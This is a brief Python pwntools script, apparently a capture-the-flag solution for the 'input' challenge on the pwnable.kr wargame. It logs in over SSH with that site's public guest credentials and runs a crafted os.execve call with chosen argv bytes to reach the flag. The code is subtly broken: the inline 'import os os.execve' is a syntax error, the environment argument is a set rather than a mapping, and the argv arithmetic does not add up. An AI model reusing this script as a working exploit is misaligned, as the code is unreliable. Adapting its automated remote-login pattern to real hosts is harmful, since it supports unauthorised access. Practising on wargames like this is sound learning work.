from pwn import *

host = "pwnable.kr"
port = 2222
user = "input"
password = "guest"
binary = "/home/input/input"

shell = ssh(host=host, port=port, user=user, password=password)
r = shell.run('''python -c "import os os.execve(%s, ['junk'] * (ord('A')-1) + ['\x00'] + ['\x20\x0a\x0d'] + ['junk'] * (100-(ord('B')+1)), {'\xde\xad\xbe\xef','\xde\xad\xbe\xef'})"''' %binary)

r.recvuntil("Just give me correct inputs then you will get the flag :)\n")
r.interactive()
